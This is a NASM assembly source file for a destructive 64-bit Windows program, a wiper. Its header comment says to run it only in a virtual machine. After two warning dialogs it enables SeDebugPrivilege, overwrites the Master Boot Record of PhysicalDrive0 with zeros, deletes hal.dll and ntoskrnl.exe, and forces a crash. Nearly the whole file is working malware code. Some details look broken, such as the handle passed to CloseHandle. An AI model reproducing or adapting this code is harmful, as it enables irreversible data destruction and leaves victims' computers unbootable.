; NASM 64-bit Windows destructive code
; HARUS dijalankan hanya di lingkungan virtual yang terkontrol!

bits 64
default rel

section .data
    szCaption      db "SYSTEM WARNING", 0
    szMessage1     db "CRITICAL SYSTEM ALERT: Memory corruption detected.", 0xD, 0xA
                   db "Running this program may cause permanent damage.", 0xD, 0xA
                   db "Continue only in a controlled environment.", 0xD, 0xA
                   db "Do you wish to proceed?", 0
    szMessage2     db "FINAL WARNING: This will overwrite critical system areas", 0xD, 0xA
                   db "including the Master Boot Record (MBR).", 0xD, 0xA
                   db "This action is IRREVERSIBLE without proper backups.", 0xD, 0xA
                   db "Are you absolutely sure you want to continue?", 0
    szError        db "Access denied. Admin privileges required.", 0
    driveName      db "\\.\PhysicalDrive0", 0
    halDll         db "C:\Windows\System32\hal.dll", 0
    ntoskrnl       db "C:\Windows\System32\ntoskrnl.exe", 0
    mbrData        times 512 db 0  ; Empty MBR data
    
    ; Glitch messages
    glitch1        db "MEMORY CORRUPTION DETECTED", 0
    glitch2        db "SYSTEM FAILURE IMMINENT", 0
    glitch3        db "KERNEL PANIC", 0
    glitch4        db "HARDWARE MALFUNCTION", 0
    
    ; For privilege escalation
    seDebugName    db "SeDebugPrivilege", 0

section .bss
    counter        resd 1
    tokenHandle    resq 1
    tkp            resb 24  ; TOKEN_PRIVILEGES structure

section .text
    extern MessageBoxA
    extern ExitProcess
    extern GetCurrentProcess
    extern OpenProcessToken
    extern LookupPrivilegeValueA
    extern AdjustTokenPrivileges
    extern CreateFileA
    extern WriteFile
    extern CloseHandle
    extern GetDesktopWindow
    extern GetDC
    extern CreateSolidBrush
    extern GetClientRect
    extern FillRect
    extern DeleteObject
    extern GetSystemMetrics
    extern CreatePen
    extern SelectObject
    extern MoveToEx
    extern LineTo
    extern SetBkMode
    extern SetTextColor
    extern TextOutA
    extern ReleaseDC
    extern Sleep
    extern Beep
    extern DeleteFileA
    extern CreateThread
    extern WaitForSingleObject

global main
main:
    ; Save registers
    push rbp
    mov rbp, rsp
    sub rsp, 32
    
    ; First warning
    xor rcx, rcx
    lea rdx, [szMessage1]
    lea r8, [szCaption]
    mov r9d, 4 | 48  ; MB_YESNO | MB_ICONWARNING
    call MessageBoxA
    cmp eax, 7  ; IDNO
    je exit_program
    
    ; Second warning
    xor rcx, rcx
    lea rdx, [szMessage2]
    lea r8, [szCaption]
    mov r9d, 4 | 48  ; MB_YESNO | MB_ICONWARNING
    call MessageBoxA
    cmp eax, 7  ; IDNO
    je exit_program
    
    ; Enable privileges
    call EnablePrivileges
    
    ; Start glitch effects
    call StartGlitchEffects
    
    ; Wait for effects to run
    mov rcx, 8000  ; 8 seconds
    call Sleep
    
    ; Overwrite MBR
    call OverwriteMBR
    
    ; Additional destructive actions
    call AdditionalDestruction
    
    ; Final crash
    call FinalCrash
    
exit_program:
    ; Restore stack and exit
    add rsp, 32
    pop rbp
    xor rcx, rcx
    call ExitProcess
    ret

EnablePrivileges:
    push rbp
    mov rbp, rsp
    sub rsp, 32
    
    ; Get current process
    call GetCurrentProcess
    
    ; Open process token
    mov rcx, rax
    lea rdx, [tokenHandle]
    mov r8, 40  ; TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    call OpenProcessToken
    test rax, rax
    jz privilege_fail
    
    ; Lookup privilege value
    xor rcx, rcx
    lea rdx, [seDebugName]
    lea r8, [tkp+4]  ; LUID part of the structure
    call LookupPrivilegeValueA
    test rax, rax
    jz privilege_fail
    
    ; Set up TOKEN_PRIVILEGES structure
    mov dword [tkp], 1  ; PrivilegeCount
    mov dword [tkp+8], 2  ; SE_PRIVILEGE_ENABLED
    
    ; Adjust token privileges
    mov rcx, [tokenHandle]
    xor rdx, rdx
    lea r8, [tkp]
    xor r9, r9
    mov qword [rsp+32], 0
    call AdjustTokenPrivileges
    test rax, rax
    jz privilege_fail
    
    jmp privilege_success
    
privilege_fail:
    xor rcx, rcx
    lea rdx, [szError]
    lea r8, [szCaption]
    mov r9d, 16  ; MB_OK | MB_ICONERROR
    call MessageBoxA
    
privilege_success:
    add rsp, 32
    pop rbp
    ret

StartGlitchEffects:
    ; Placeholder for glitch effects implementation
    ret

OverwriteMBR:
    push rbp
    mov rbp, rsp
    sub rsp, 48
    
    ; Try to open physical drive
    lea rcx, [driveName]
    mov rdx, 0x40000000  ; GENERIC_WRITE
    mov r8, 3            ; FILE_SHARE_READ | FILE_SHARE_WRITE
    xor r9, r9
    mov qword [rsp+32], 3  ; OPEN_EXISTING
    mov qword [rsp+40], 0
    call CreateFileA
    cmp rax, -1  ; INVALID_HANDLE_VALUE
    je mbr_fail
    
    ; Write to MBR
    mov rcx, rax
    lea rdx, [mbrData]
    mov r8, 512
    lea r9, [rsp+32]  ; bytesWritten
    mov qword [rsp+40], 0
    call WriteFile
    
    ; Close handle
    mov rcx, rax
    call CloseHandle
    
mbr_fail:
    add rsp, 48
    pop rbp
    ret

AdditionalDestruction:
    ; Try to delete critical system files
    lea rcx, [halDll]
    call DeleteFileA
    
    lea rcx, [ntoskrnl]
    call DeleteFileA
    
    ret

FinalCrash:
    ; Multiple crash methods
    ; 1. Invalid memory access
    xor rax, rax
    mov [rax], rax
    
    ; 2. Invalid instruction
    ud2  ; Undefined instruction
    
    ; 3. Infinite loop
    .loop:
    jmp .loop
    ret
